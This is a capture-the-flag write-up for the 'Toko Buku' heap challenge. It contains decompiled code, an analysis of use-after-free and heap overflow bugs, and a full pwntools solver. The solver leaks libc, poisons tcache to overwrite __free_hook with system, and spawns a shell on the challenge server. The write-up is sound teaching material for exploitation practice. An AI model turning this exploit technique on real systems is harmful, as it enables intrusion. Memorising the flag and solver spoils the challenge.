---
description: A pwn heap challenge
---

# Toko Buku

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Given an ELF file, when we run it:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

As the name suggests, it is a bookstore program. We can see here the binary has a full protection, which implies that maybe this is a heap challenge. We proceed to decompile it using ida and got these functions:

main:

```c
__int64 __fastcall main(const char *a1, char **a2, char **a3)
{
  int v4; // [rsp+Ch] [rbp-54h] BYREF
  _QWORD v5[10]; // [rsp+10h] [rbp-50h] BYREF

  v5[9] = __readfsqword(0x28u);
  memset(v5, 0, 64);
  while ( 1 )
  {
    sub_1277(a1, a2, a3);
    a2 = (char **)&v4;
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        a1 = (const char *)v5;
        sub_12D6(v5);
        break;
      case 2:
        a1 = (const char *)v5;
        sub_1419(v5);
        break;
      case 3:
        a1 = (const char *)v5;
        sub_14F7(v5);
        break;
      case 4:
        a1 = (const char *)v5;
        sub_15AE(v5);
        break;
      case 5:
        return 0;
      default:
        a1 = "...";
        puts("...");
        break;
    }
  }
}

```

Sub\_1277 (menu):

```c
int sub_1277()
{
  puts("toko buku itoid");
  puts("1. masukan buku di rak");
  puts("2. buang buku di suatu rak");
  puts("3. lihat judul buku");
  puts("4. ganti buku di rak");
  puts("5. cukup");
  return puts("pilihan: ");
}

```

Sub\_12D6 (Masukkan buku):

```c
unsigned __int64 __fastcall sub_12D6(__int64 a1)
{
  void **v1; // rbx
  unsigned __int64 v3; // [rsp+18h] [rbp-28h] BYREF
  size_t size; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  printf("nomor rak (1-8): ");
  __isoc99_scanf("%zu", &v3);
  if ( v3 && v3 <= 8 )
  {
    --v3;
    printf("ukuran buku: ");
    if ( (unsigned int)__isoc99_scanf("%zu", &size) == 1 && size )
    {
      v1 = (void **)(8 * v3 + a1);
      *v1 = malloc(size);
      printf("judul buku: ");
      __isoc99_scanf("%39s", *(_QWORD *)(8 * v3 + a1));
      puts("dah");
    }
    else
    {
      puts("ukuran tidak valid!");
    }
  }
  else
  {
    puts("itu rak yang mana?");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

Sub\_1419 (Buang buku):

```c
unsigned __int64 __fastcall sub_1419(__int64 a1)
{
  unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("nomor rak (1-8): ");
  __isoc99_scanf("%zu", &v2);
  if ( v2 && v2 <= 8 )
  {
    --v2;
    if ( *(_QWORD *)(8 * v2 + a1) )
    {
      free(*(void **)(8 * v2 + a1));
      puts("buku dah dibuang");
    }
    else
    {
      puts("rak kosong!");
    }
  }
  else
  {
    puts("itu rak yang mana?");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

Sub\_14F7 (Lihat judul):

```c
unsigned __int64 __fastcall sub_14F7(__int64 a1)
{
  __int64 v2; // [rsp+18h] [rbp-18h] BYREF
  char *s; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("nomor rak (1-8): ");
  __isoc99_scanf("%zu", &v2);
  --v2;
  s = *(char **)(8 * v2 + a1);
  if ( s )
  {
    printf("judul buku: ");
    puts(s);
  }
  else
  {
    puts("rak kosong");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

Sub\_15AE (ganti buku):

```c
unsigned __int64 __fastcall sub_15AE(__int64 a1)
{
  unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("nomor rak (1-8): ");
  __isoc99_scanf("%zu", &v2);
  if ( v2 && v2 <= 8 )
  {
    --v2;
    printf("judul buku baru: ");
    __isoc99_scanf("%39s", *(_QWORD *)(8 * v2 + a1));
    puts("buku dah diganti");
  }
  else
  {
    puts("itu rak yang mana?");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

From these functions we get a few vulns like UAF cause the pointer is not nulled after freed, Heap overflow via scanf, leak unsorted-bin.&#x20;

So the exploit flow: allocate a large chunk -> free the chunk to get into unsorted bin -> show the chunk to leak the unsorted bin pointer -> get libc base from the leaked address -> then allocate two chunks  then free it -> UAF write to overwrite the fd to **\_\_free\_hook** address -> malloc two times, the second malloc should give us the **\_\_free\_hook** pointer -> write system to **\_\_free\_hook** -> trigger it by allocating a chunk with /bin/sh\x00 in it, then free the chunk

solver.py:

```python
from pwn import *

BIN="./tokobuku_patched"
LIBC="./libc.so.6"
LD="./ld-linux-x86-64.so.2"
HOST, PORT = "143.198.215.203", 20040

context.binary = ELF(BIN)
elf  = context.binary
libc = ELF(LIBC)

def IO():
    return remote(HOST, PORT) if args.REMOTE else process([LD, "--library-path", ".", BIN])

def m(c): io.sendlineafter(b"pilihan: ", str(c).encode())
def add(i,s,d=b"A"):
    m(1); io.sendlineafter(b"nomor rak (1-8): ", str(i).encode())
    io.sendlineafter(b"ukuran buku: ", str(s).encode())
    io.sendlineafter(b"judul buku: ", d)
def delete(i):
    m(2); io.sendlineafter(b"nomor rak (1-8): ", str(i).encode())
def show(i):
    m(3); io.sendlineafter(b"nomor rak (1-8): ", str(i).encode())
    io.recvuntil(b"judul buku: ")
    return io.recvline().strip()
def edit(i,d):
    m(4); io.sendlineafter(b"nomor rak (1-8): ", str(i).encode())
    io.sendlineafter(b"judul buku baru: ", d)

def main():
    global io
    io = IO()

    # libc leak via unsorted bin
    add(1, 0x420, b"A")
    add(2, 0x20,  b"G")
    delete(1)
    leak = u64(show(1).ljust(8, b"\x00"))
    libc.address = leak - (libc.symbols["main_arena"] + 0x60)
    free_hook    = libc.sym["__free_hook"]
    system_addr  = libc.sym["system"]

    # tcache poisoning -> __free_hook
    add(3, 0x60, b"C")
    add(4, 0x60, b"D")
    delete(4); delete(3)
    edit(3, p64(free_hook))
    add(5, 0x60, b"E")
    add(6, 0x60, p64(system_addr))

    # trigger system("/bin/sh")
    add(7, 0x20, b"/bin/sh\x00")
    delete(7)

    io.interactive()

if __name__ == "__main__":
    main()
```

When we run it, we get the flag:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Flag: WRECKIT60{t0k0\_buku\_1t01d\_m4nt4p\_s3k4l111!!!!!\_h4h4h4h4h4}
